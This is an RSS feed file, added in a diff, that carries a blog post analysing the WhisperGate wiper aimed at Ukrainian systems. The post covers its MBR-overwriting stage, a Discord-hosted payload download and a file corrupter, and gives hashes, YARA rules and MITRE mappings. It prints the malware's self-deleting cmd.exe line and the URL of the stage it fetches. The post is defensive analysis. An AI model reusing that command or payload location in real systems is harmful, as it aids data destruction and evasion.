@@ -1,0 +1,530 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Reverse Engineering on Nathan's Blog</title><link>https://demo.stack.jimmycai.com/categories/reverse-engineering/</link><description>Recent content in Reverse Engineering on Nathan's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 16 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://demo.stack.jimmycai.com/categories/reverse-engineering/index.xml" rel="self" type="application/rss+xml"/><item><title>Deconstructing WhisperGate</title><link>https://demo.stack.jimmycai.com/p/whispergate/</link><pubDate>Sun, 16 Jan 2022 00:00:00 +0000</pubDate><guid>https://demo.stack.jimmycai.com/p/whispergate/</guid><description>&lt;img src="https://demo.stack.jimmycai.com/p/whispergate/whisper.jpg" alt="Featured image of post Deconstructing WhisperGate" />&lt;h1 id="introduction">Introduction&lt;/h1>
+&lt;p>Destructive malware is some of the most dangerous software out there. Where a malicious coin miner might slow down your system or a RAT might be used to exfiltrate sensitive data, destructive malware exists for one purpose, causing damage. Arguably one of the most popular cyber attacks in history Stuxnet, was destructive in nature. The main aspect of ransomware that makes it so dangerous is it&amp;rsquo;s destructive nature, if it didn&amp;rsquo;t encrypt a system and make it unusable would anyone pay the ransom?&lt;/p>
+&lt;p>On 1/15/2022 Microsoft released information on a new campaign targetting Ukrainian systems with destructive malware. It includes four different stages:&lt;/p>
+&lt;!-- raw HTML omitted -->
+&lt;ol>
+&lt;li>A purely destructive MBR wiper that displays a ransom note on next bootup.&lt;/li>
+&lt;li>Downloader that&amp;rsquo;s used to download other stages of the attack.&lt;/li>
+&lt;li>Payload that adds an exclusion to Windows Defender and allows the final stage to be ran.&lt;/li>
+&lt;li>File corrupter that will corrupt any files with a specific extension.&lt;/li>
+&lt;/ol>
+&lt;h2 id="iocs">IOCs&lt;/h2>
+&lt;h3 id="stage-1">Stage 1:&lt;/h3>
+&lt;h4 id="sha256">SHA256:&lt;/h4>
+&lt;p>&lt;code>a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92&lt;/code>&lt;/p>
+&lt;h4 id="unique-strings">Unique Strings:&lt;/h4>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">1AVNM68gj6PGPFcJuftKATa4WLnzg8fpfv
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">8BEDC411012A33BA34F49130D0F186993C6A32DAD8976F6A5D82C1ED23054C057ECED5496F65
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">You should pay us $10k via bitcoin wallet
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="system-behavior">System Behavior:&lt;/h4>
+&lt;p>Overwritting &amp;ldquo;\\.\PhysicalDrive0&amp;rdquo; (MBR) with 512 bytes of the ransom note.&lt;/p>
+&lt;h4 id="virustotal">VirusTotal:&lt;/h4>
+&lt;p>&lt;a class="link" href="https://www.virustotal.com/gui/file/a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92/detection" target="_blank" rel="noopener"
+>https://www.virustotal.com/gui/file/a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92/detection&lt;/a>&lt;/p>
+&lt;h3 id="stage-2">Stage 2:&lt;/h3>
+&lt;h4 id="sha256-1">SHA256:&lt;/h4>
+&lt;p>&lt;code>dcbbae5a1c61dbbbb7dcd6dc5dd1eb1169f5329958d38b58c3fd9384081c9b78&lt;/code>&lt;/p>
+&lt;h4 id="unique-strings-1">Unique Strings:&lt;/h4>
+&lt;p>:::info
+Make sure to specify 16 byte length when running strings &lt;code>strings -e b file_name&lt;/code> to see these.
+:::&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">DxownxloxadDxatxxax
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">ttps://cdn.discordapp.com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="system-behavior-1">System Behavior:&lt;/h4>
+&lt;p>Powershell executing a base64 encoded payload.&lt;br>
+DNS request and subsequent file download from cdn.discordapp.com&lt;/p>
+&lt;h4 id="virustotal-1">VirusTotal:&lt;/h4>
+&lt;p>&lt;a class="link" href="https://www.virustotal.com/gui/file/dcbbae5a1c61dbbbb7dcd6dc5dd1eb1169f5329958d38b58c3fd9384081c9b78" target="_blank" rel="noopener"
+>https://www.virustotal.com/gui/file/dcbbae5a1c61dbbbb7dcd6dc5dd1eb1169f5329958d38b58c3fd9384081c9b78&lt;/a>&lt;/p>
+&lt;h3 id="stage-3">Stage 3:&lt;/h3>
+&lt;h4 id="sha256-2">SHA256:&lt;/h4>
+&lt;p>&lt;code>9ef7dbd3da51332a78eff19146d21c82957821e464e8133e9594a07d716d892d&lt;/code>&lt;/p>
+&lt;h4 id="virustotal-2">VirusTotal:&lt;/h4>
+&lt;p>&lt;a class="link" href="https://www.virustotal.com/gui/file/9ef7dbd3da51332a78eff19146d21c82957821e464e8133e9594a07d716d892d" target="_blank" rel="noopener"
+>https://www.virustotal.com/gui/file/9ef7dbd3da51332a78eff19146d21c82957821e464e8133e9594a07d716d892d&lt;/a>&lt;/p>
+&lt;h3 id="stage-4">Stage 4:&lt;/h3>
+&lt;h4 id="sha256-3">SHA256:&lt;/h4>
+&lt;p>&lt;code>34ca75a8c190f20b8a7596afeb255f2228cb2467bd210b2637965b61ac7ea907&lt;/code>&lt;/p>
+&lt;h4 id="unique-strings-2">Unique Strings:&lt;/h4>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cmd.exe /min /C ping 111.111.111.111 -n 5 -w 10 &amp;gt; Nul &amp;amp; Del /f /q &amp;#34;%s&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="system-behavior-2">System Behavior:&lt;/h4>
+&lt;p>Mass file writing and data corruption.&lt;br>
+Pinging 111.111.111.111 and then deleting itself.&lt;/p>
+&lt;h4 id="virustotal-3">VirusTotal:&lt;/h4>
+&lt;p>&lt;a class="link" href="https://www.virustotal.com/gui/file/34ca75a8c190f20b8a7596afeb255f2228cb2467bd210b2637965b61ac7ea907" target="_blank" rel="noopener"
+>https://www.virustotal.com/gui/file/34ca75a8c190f20b8a7596afeb255f2228cb2467bd210b2637965b61ac7ea907&lt;/a>&lt;/p>
+&lt;h2 id="stage-1-1">Stage 1&lt;/h2>
+&lt;p>Stage 1 is a pretty basic executable. Essentially all it does is overwrite the MBR with the ransom note. It uses &lt;em>CreateFileW&lt;/em> to create a file handler pointing to the Master Boot Record and uses &lt;em>WriteFile&lt;/em> to overwrite the MBR with the ransom note.&lt;/p>
+&lt;p>Once this stage is executed the host machine is left inoperable. Interestingly enough, if a machine is utilizing UEFI (and cmon, its 2022. Every machine should be) the ransom note &lt;strong>will not&lt;/strong> be displayed on next bootup but the host will still be inoperable.&lt;/p>
+&lt;p>Screenshot of impacted host:
+&lt;img src="https://media.discordapp.net/attachments/437733241496141826/937151814409793556/unknown.png"
+loading="lazy"
+alt="Image"
+>&lt;/p>
+&lt;p>The ransom note is quite humorous as by the time any user sees this message, the computer has been damaged and the MBR already wiped and there is no function to fix any damage caused. Thankfully no one has fallen for this and the BTC address has not received much BTC at the time of this post:
+&lt;a class="link" href="https://www.blockchain.com/btc/address/1AVNM68gj6PGPFcJuftKATa4WLnzg8fpfv" target="_blank" rel="noopener"
+>1AVNM68gj6PGPFcJuftKATa4WLnzg8fpfv&lt;/a>&lt;/p>
+&lt;p>&lt;img src="https://demo.stack.jimmycai.com/p/whispergate/Pasted_image_20220129094431.png"
+width="784"
+height="335"
+srcset="https://demo.stack.jimmycai.com/p/whispergate/Pasted_image_20220129094431_huabf36fdd2d46129dbb4886a5c9c4c37d_26995_480x0_resize_box_3.png 480w, https://demo.stack.jimmycai.com/p/whispergate/Pasted_image_20220129094431_huabf36fdd2d46129dbb4886a5c9c4c37d_26995_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image"
+class="gallery-image"
+data-flex-grow="234"
+data-flex-basis="561px"
+>&lt;/p>
+&lt;p>Decompiled wiper function:
+&lt;img src="https://demo.stack.jimmycai.com/p/whispergate/Pasted_image_20220129093558.png"
+width="706"
+height="145"
+srcset="https://demo.stack.jimmycai.com/p/whispergate/Pasted_image_20220129093558_hud364b51e44e62b5c90424431657e225e_28472_480x0_resize_box_3.png 480w, https://demo.stack.jimmycai.com/p/whispergate/Pasted_image_20220129093558_hud364b51e44e62b5c90424431657e225e_28472_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image"
+class="gallery-image"
+data-flex-grow="486"
+data-flex-basis="1168px"
+>&lt;/p>
+&lt;h3 id="detection-rules">Detection Rules:&lt;/h3>
+&lt;h4 id="yara">Yara:&lt;/h4>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">rule whispergate_stage_1 {
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> meta:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> author = &amp;#34;Nathan Burns&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> date = &amp;#34;1/30/2022&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> md5 = &amp;#34;5d5c99a08a7d927346ca2dafa7973fc1&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> strings:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> $s1 = &amp;#34;1AVNM68gj6PGPFcJuftKATa4WLnzg8fpfv&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> $s2 = &amp;#34;8BEDC411012A33BA34F49130D0F186993C6A32DAD8976F6A5D82C1ED23054C057ECED5496F65&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> $f1 = &amp;#34;WriteFile&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> $f2 = &amp;#34;CreateFileW&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> condition:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 1 of ($s*) and 1 of ($f*)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="mitre-attck-techniques">MITRE ATT&amp;amp;CK Techniques&lt;/h3>
+&lt;p>&lt;a class="link" href="https://attack.mitre.org/techniques/T1561/002/" target="_blank" rel="noopener"
+>T1561.002 - Disk Structure Wipe&lt;/a>&lt;br>
+&lt;a class="link" href="https://attack.mitre.org/techniques/T1491/001/" target="_blank" rel="noopener"
+>T1491.001 - Internal Defacement&lt;/a>&lt;/p>
+&lt;h2 id="stage-2-1">Stage 2&lt;/h2>
+&lt;p>Stage 2 is where it gets more complex. It contains obfuscated code and starts downloading the next stage. I have zero experience decompiling .NET malware, but I was able to grab some interesting strings and see some weird behavior. A very interesting string is that this stage attempts to pull malware from discord, behavior that&amp;rsquo;s been seen in the &lt;a class="link" href="https://cyware.com/news/abuse-of-discord-cdn-witnesses-significant-rise-277d273d" target="_blank" rel="noopener"
+>past.&lt;/a>&lt;/p>
+&lt;p>&lt;img src="https://demo.stack.jimmycai.com/p/whispergate/Pasted_image_20220129125130.png"
+width="720"
+height="89"
+srcset="https://demo.stack.jimmycai.com/p/whispergate/Pasted_image_20220129125130_hu19efaee94e6c2a5aabbd3f97bf582b70_9528_480x0_resize_box_3.png 480w, https://demo.stack.jimmycai.com/p/whispergate/Pasted_image_20220129125130_hu19efaee94e6c2a5aabbd3f97bf582b70_9528_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image"
+class="gallery-image"
+data-flex-grow="808"
+data-flex-basis="1941px"
+>&lt;/p>
+&lt;p>It also attempts to evade detection by &amp;ldquo;obfuscating&amp;rdquo; some variables
+&lt;img src="https://demo.stack.jimmycai.com/p/whispergate/Pasted_image_20220129125228.png"
+width="424"
+height="80"
+srcset="https://demo.stack.jimmycai.com/p/whispergate/Pasted_image_20220129125228_hu269e446a133117cb154177a2af698962_5510_480x0_resize_box_3.png 480w, https://demo.stack.jimmycai.com/p/whispergate/Pasted_image_20220129125228_hu269e446a133117cb154177a2af698962_5510_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image"
+class="gallery-image"
+data-flex-grow="530"
+data-flex-basis="1272px"
+>&lt;/p>
+&lt;p>It&amp;rsquo;s my guess that this stage is purely a dropper for stage 3, but my .NET decompilation skills are extremely weak so I decided to just run it in a closed lab environment with some sysmon rules. I plan on making a blogpost later on after I create a more detailed and &lt;em>hopefully&lt;/em> safer malware analysis lab.&lt;/p>
+&lt;p>Anyways, this was the behavior I spotted after running it in a lab environment.&lt;/p>
+&lt;p>The first thing it does it run this obfuscated powershell command:&lt;/p>
+&lt;p>&lt;img src="https://media.discordapp.net/attachments/437733241496141826/937211009926594650/vmware_gEbM5IIhfa.png"
+loading="lazy"
+alt="Image"
+>&lt;/p>
+&lt;p>Decoded command:&lt;/p>
+&lt;p>&lt;img src="https://media.discordapp.net/attachments/437733241496141826/937211008685047838/vmware_FIWwAGCyAz.png"
+loading="lazy"
+alt="Image"
+>&lt;/p>
+&lt;p>This command sleeps the script for 10 seconds until it downloads the stage 3 binary from &lt;strong>cdn.discordapp.com&lt;/strong>, presumably using the obfuscated &lt;strong>DownloadData&lt;/strong> powershell command.&lt;/p>
+&lt;p>&lt;img src="https://media.discordapp.net/attachments/437733241496141826/937211009184186418/vmware_ZTnw9fJTgk.png"
+loading="lazy"
+alt="Image"
+>&lt;/p>
+&lt;p>This is all I could gather from the stage 2 binary, but it most certainly executes the stage 3 binary after successful download as well.&lt;/p>
+&lt;h3 id="detection-rules-1">Detection Rules:&lt;/h3>
+&lt;h4 id="yara-1">YARA:&lt;/h4>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">rule whispergate_stage_2 {
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> meta:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> author = &amp;#34;Nathan Burns&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> date = &amp;#34;1/30/2022&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> md5 = &amp;#34;14c8482f302b5e81e3fa1b18a509289d&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> strings:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> $s1 = &amp;#34;DxownxloxadDxatxxax&amp;#34; wide ascii
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> $s2 = &amp;#34;ttps://cdn.discordapp.com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg&amp;#34; wide ascii
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> condition:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> $s1 or $s2
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="mitre-attck-techniques-1">MITRE ATT&amp;amp;CK Techniques&lt;/h3>
+&lt;p>&lt;a class="link" href="https://attack.mitre.org/techniques/T1059/001/" target="_blank" rel="noopener"
+>T1059.001 - Command and Scripting Interpreter: PowerShell&lt;/a>&lt;br>
+&lt;a class="link" href="https://attack.mitre.org/techniques/T1583/006/" target="_blank" rel="noopener"
+>T1583.006 - Acquire Infrastructure: Web Services&lt;/a>&lt;/p>
+&lt;h2 id="stage-3-1">Stage 3&lt;/h2>
+&lt;p>Unfortunately I couldn&amp;rsquo;t get my hands on the original stage 3 binary so I can&amp;rsquo;t do much analysis.
+Sorry!&lt;/p>
+&lt;h2 id="stage-4-1">Stage 4&lt;/h2>
+&lt;p>This is a rather destructive final stage. It contains a list of file extensions that it will attempt to corrupt and then finally it will delete itself. To ensure the device is still &amp;ldquo;operable&amp;rdquo; it will ignore files in the &lt;code>Windows&lt;/code> directory.&lt;/p>
+&lt;p>File Corrupter Function:&lt;/p>
+&lt;p>&lt;img src="https://demo.stack.jimmycai.com/p/whispergate/Pasted_image_20220130023351.png"
+width="701"
+height="653"
+srcset="https://demo.stack.jimmycai.com/p/whispergate/Pasted_image_20220130023351_hu06e122d69c6b3e8aa1557dadbd7e580e_56595_480x0_resize_box_3.png 480w, https://demo.stack.jimmycai.com/p/whispergate/Pasted_image_20220130023351_hu06e122d69c6b3e8aa1557dadbd7e580e_56595_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image"
+class="gallery-image"
+data-flex-grow="107"
+data-flex-basis="257px"
+>
+Opening File:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">_File = _wfopen(Filename,L&amp;#34;wb&amp;#34;);
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Writing data to file (Corrupting it in the process):&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">fwrite(_Str,1,0x100000,_File);
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Renaming file:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">_wrename(Filename,pwVar2);
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Deletes self after being ran:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cmd.exe /min /C ping 111.111.111.111 -n 5 -w 10 &amp;gt; Nul &amp;amp; Del /f /q &amp;#34;%s&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;!-- raw HTML omitted -->
+&lt;!-- raw HTML omitted -->
+&lt;h3 id="lab-analysis">Lab Analysis:&lt;/h3>
+&lt;p>Creating test files inside users download folder:
+&lt;img src="https://media.discordapp.net/attachments/437733241496141826/937433471649992814/unknown.png"
+loading="lazy"
+alt="Image"
+>
+&lt;img src="https://media.discordapp.net/attachments/437733241496141826/937433472186871888/unknown.png"
+loading="lazy"
+alt="Image"
+>&lt;/p>
+&lt;p>Files after execution of stage_4.exe: (Note the randomized file extensions)
+&lt;img src="https://media.discordapp.net/attachments/437733241496141826/937433471196999680/unknown.png"
+loading="lazy"
+alt="Image"
+>
+&lt;img src="https://media.discordapp.net/attachments/437733241496141826/937433470500761610/unknown.png?width=810&amp;amp;height=575"
+loading="lazy"
+alt="Image"
+>&lt;/p>
+&lt;h3 id="sysmon-logs-generated">Sysmon logs generated:&lt;/h3>
+&lt;p>Changing file extension and overwriting data:
+&lt;img src="https://media.discordapp.net/attachments/437733241496141826/937433402125209680/unknown.png"
+loading="lazy"
+alt="Image"
+>&lt;/p>
+&lt;p>Executing cleanup command to evade detection:
+&lt;img src="https://media.discordapp.net/attachments/437733241496141826/937433402464944198/unknown.png"
+loading="lazy"
+alt="Image"
+>&lt;/p>
+&lt;p>Corrupting additional files:
+&lt;img src="https://media.discordapp.net/attachments/437733241496141826/937433401621880862/unknown.png"
+loading="lazy"
+alt="Image"
+>&lt;/p>
+&lt;h3 id="detection-rules-2">Detection Rules:&lt;/h3>
+&lt;h4 id="yara-2">Yara:&lt;/h4>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">rule whisphergate_stage_4 {
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> meta:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> author = &amp;#34;Nathan Burns&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> date = &amp;#34;1/30/2022&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> md5 = &amp;#34;3907c7fbd4148395284d8e6e3c1dba5d&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> strings:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> $f1 = &amp;#34;cmd.exe /min /C ping 111.111.111.111 -n 5 -w 10 &amp;gt; Nul &amp;amp; Del /f /q&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> $x1 = &amp;#34;.BACKUP&amp;#34; wide ascii
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> $x2 = &amp;#34;.SQLITE3&amp;#34; wide ascii
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> $x3 = &amp;#34;.DOCX&amp;#34; wide ascii
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> condition:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> $f1 and 1 of ($x*)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="mitre-attck-techniques-2">MITRE ATT&amp;amp;CK Techniques:&lt;/h3>
+&lt;p>&lt;a class="link" href="https://attack.mitre.org/techniques/T1485/" target="_blank" rel="noopener"
+>T1485 - Data Destruction&lt;/a>&lt;br>
+&lt;a class="link" href="https://attack.mitre.org/techniques/T1070/004/" target="_blank" rel="noopener"
+>T1070.004 - Indicator Removal on Host: File Deletion&lt;/a>&lt;/p>
+&lt;h2 id="conclusion">Conclusion&lt;/h2>
+&lt;p>This malware attack was focused on one thing, causing damage and destroying data. There are no attempts to exfiltrate data or take control of any systems leading me to believe the primary goal of this attack was to sow doubt in Ukraine&amp;rsquo;s ability to defend itself in cyber space. It would be a crime not to mention how this attack coincides with the current Russian military buildup on Ukraine&amp;rsquo;s border.&lt;/p>
+&lt;p>You may have noticed some changes from my regular blog posts, most notably including YARA rules and MITRE ATT&amp;amp;CK Techniques. I&amp;rsquo;m hoping these additions help defenders secure their networks against these attacks and help me improve my own skills.&lt;/p>
+&lt;p>Analyzing this sample has been an amazing learning experience, if you have any suggestions or concerns, please don&amp;rsquo;t hestitate to &lt;a class="link" href="https://demo.stack.jimmycai.com/contact" >contact me&lt;/a>.&lt;/p>
+&lt;h2 id="references">References:&lt;/h2>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://elastic.github.io/security-research/malware/2022/01/01.operation-bleeding-bear/article/" target="_blank" rel="noopener"
+>https://elastic.github.io/security-research/malware/2022/01/01.operation-bleeding-bear/article/&lt;/a> Great article that has information on Stage 3.&lt;/li>
